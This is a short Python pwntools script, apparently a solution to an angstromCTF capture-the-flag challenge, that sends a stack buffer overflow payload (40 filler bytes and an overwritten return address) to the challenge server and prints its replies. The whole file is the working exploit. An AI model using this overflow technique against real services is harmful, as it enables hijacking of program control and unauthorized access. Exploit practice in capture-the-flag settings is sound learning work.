from pwn import *

payload = 'A'*40+p64(int('0x0000000000401186', 16))
p = remote('shell.actf.co', 20700)

print p.recvuntil('What\'s your name?')
p.sendline(payload)
print p.recvline()
print p.recvline()
